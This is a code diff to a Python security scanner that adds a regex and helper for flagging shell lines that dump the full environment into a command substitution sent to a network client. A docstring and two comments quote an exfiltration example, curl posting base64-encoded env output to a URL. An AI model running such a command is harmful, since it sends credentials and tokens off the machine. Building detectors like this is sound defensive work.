@@ -767,6 +767,32 @@ def _shell_line_is_env_read_to_net_sink(line: str) -> bool:
     return not _line_has_loopback_or_private_ip_shell(line)
 
 
+# A command substitution whose pipeline STARTS with a full-environment dump
+# (bare `env` / `printenv` with no variable name, `export -p`, `declare -x`,
+# `cat /proc/self/environ`). `printenv HOME` (one named variable) is not a dump.
+_CMDSUB_ENV_DUMP_HEAD_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:\$\(|`)\s*(?:(?:command\s+|sudo\s+|exec\s+)?(?:/\S*/)?(?:env|printenv)(?:\s+-0)?|export\s+-p|declare\s+-x|cat\s+/proc/(?:self|\d+)/environ)"
+    r"\s*(?:[|)`]|$)",
+    re.IGNORECASE,
+)
+
+
+def _cmdsub_env_dump_to_net_client(line: str) -> bool:
+    """True iff ``line`` captures a full environment dump in a command
+    substitution AND runs a non-loopback network client.
+
+    WHY: ``env`` is in ``_SAFE_CMDSUB_DATA_COMMANDS`` and ``base64`` is in
+    ``_PIPE_TEXT_PROCESSOR_RE``, so ``curl -d "$(env | base64)" URL`` was cleared
+    as a harmless data command and its CMD_INJECTION half came back suppressed
+    while the whole environment left the machine. A dump handed to a network
+    client is exfiltration, never a data read, so both suppressors must refuse it.
+    The check is line-level (a dump cmdsub anywhere + a client anywhere on the line),
+    so it fails toward visible, never toward cleared."""
+    if not _CMDSUB_ENV_DUMP_HEAD_RE.search(line):
+        return False
+    return bool(_SHELL_NET_TOOL_RE.search(line)) and not _line_has_loopback_or_private_ip_shell(line)
+
+
 def _line_leaks_secret_var_to_url(line: str) -> bool:
     """True iff a secret-looking shell variable (``$API_TOKEN`` / ``${KEY}`` /
     …) is interpolated into a URL query-parameter or a ``-d``/``--data`` POST
@@ -798,6 +824,10 @@ def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
         return False
     # Output piped/redirected into a network egress sink → keep visible.
     if _line_has_exfil_sink(line):
+        return False
+    # Full environment dump captured for a network client (`curl -d "$(env | base64)"`)
+    # → keep visible; `env` is otherwise a safe data command here.
+    if _cmdsub_env_dump_to_net_client(line):
         return False
     # Genuine execution surface anywhere on the line → keep visible.
     if _CMDSUB_EXEC_WRAP_RE.search(line):
@@ -846,6 +876,10 @@ def _pipe_to_text_processor(line: str, match: str) -> bool:
     if _reads_sensitive_path(line):
         return False
     if _line_has_exfil_sink(line):
+        return False
+    # Full environment dump encoded by a text processor for a network client
+    # (`curl -d "$(env | base64)"`) → keep visible; `| base64` is not a safe carve-out here.
+    if _cmdsub_env_dump_to_net_client(line):
         return False
     if _CMDSUB_EXEC_WRAP_RE.search(line):
         return False
